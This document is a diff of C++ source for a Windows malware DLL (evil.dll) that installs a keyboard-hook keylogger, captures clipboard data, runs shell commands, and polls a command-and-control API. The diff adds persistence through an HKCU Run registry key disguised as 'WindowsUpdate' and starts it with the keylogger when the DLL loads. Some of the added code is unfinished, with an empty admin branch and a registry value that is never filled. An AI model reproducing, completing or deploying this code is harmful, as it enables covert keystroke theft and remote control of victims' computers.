@@ -17,6 +17,8 @@ HHOOK _hHook;
 KBDLLHOOKSTRUCT kbData;
 HINSTANCE hDllInst = NULL;
 char dllPath[MAX_PATH];
+char stagerPath[MAX_PATH];
+char evilDllPath[MAX_PATH];
 char outputFilePath[MAX_PATH];
 char clipboardFilePath[MAX_PATH];
 static DWORD lastKey = 0;
@@ -382,7 +384,6 @@ std::string exec_cmd(const std::string &cmd)
     wchar_t realCmdline[1024] = {0};
     swprintf_s(realCmdline, 1024, L"C:\\Windows\\System32\\cmd.exe /c set PATH=C:\\Windows\\System32;C:\\Windows;C:\\Windows\\System32\\Wbem && %s", wcmd.c_str());
 
-    
     char tempPath[MAX_PATH];
     GetTempPathA(MAX_PATH, tempPath);
     wchar_t tempPathW[MAX_PATH];
@@ -445,7 +446,7 @@ std::string exec_cmd(const std::string &cmd)
 
 DWORD WINAPI C2MonitorThread(LPVOID lpParam)
 {
-    API api("S8U412XFGM8PZA11BLQO1860JML1WIL1UOVLVHRUZA6IQJ95U");
+    API api("");
     CommandManager cmdManager(&api, "w6y4WrQtRNeIM5Kkz4PUMg");
 
     while (true)
@@ -467,9 +468,49 @@ DWORD WINAPI C2MonitorThread(LPVOID lpParam)
         catch (...)
         {
         }
-        Sleep(5000); 
+        Sleep(5000);
     }
     return 0;
+}
+
+BOOL IsUserAdmin()
+{
+    BOOL isAdmin = FALSE;
+    PSID adminGroup = NULL;
+    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
+
+    // 創建管理員組的 SID
+    if (AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup))
+    {
+        // 檢查當前用戶是否屬於管理員組
+        CheckTokenMembership(NULL, adminGroup, &isAdmin);
+        FreeSid(adminGroup);
+    }
+    return isAdmin;
+}
+
+void RegPersistence(HKEY Reg_Root, const char *Reg_Path, const char *valueName, const char *valueData)
+{
+    HKEY hKey = NULL;
+    // 開啟reg
+    LONG Open_Reg = RegCreateKeyExA(Reg_Root, Reg_Path, 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL);
+    Open_Reg = RegSetValueExA(hKey, valueName, 0, REG_SZ, (const BYTE *)valueData, strlen(valueData) + 1);
+    RegCloseKey(hKey);
+}
+
+void Persis()
+{
+    const char *valueName = "evil.dll";
+    char valueData[MAX_PATH * 2];
+    // 格式: loader.exe <PID/EXE PATH> <FULL DLL PATH>
+    
+    // 檢查是否為管理員權限
+    if (IsUserAdmin()){
+    }
+    else{
+        // 非管理員：寫入 HKEY_CURRENT_USER
+        RegPersistence(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", "WindowsUpdate", valueData);
+    }
 }
 
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
@@ -478,7 +519,24 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserv
     {
     case DLL_PROCESS_ATTACH:
     {
+        
+        GetModuleFileNameA(hModule, dllPath, MAX_PATH);
+
+        // 提取目录路径
+        char dirPath[MAX_PATH];
+        strncpy(dirPath, dllPath, MAX_PATH);
+        char *lastSlash = strrchr(dirPath, '\\');
+        if (lastSlash)
+        {
+            *lastSlash = '\0';
+        }
+
+        // 构建 Stager.exe 和 evil.dll 的完整路径
+        snprintf(stagerPath, sizeof(stagerPath), "%s\\stager.exe", dirPath);
+        snprintf(evilDllPath, sizeof(evilDllPath), "%s\\evil.dll", dirPath);
+
         SetupFilePath();
+        Persis();
         HANDLE Keylogger_Thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)keylogger, NULL, 0, NULL);
         CloseHandle(Keylogger_Thread);
 
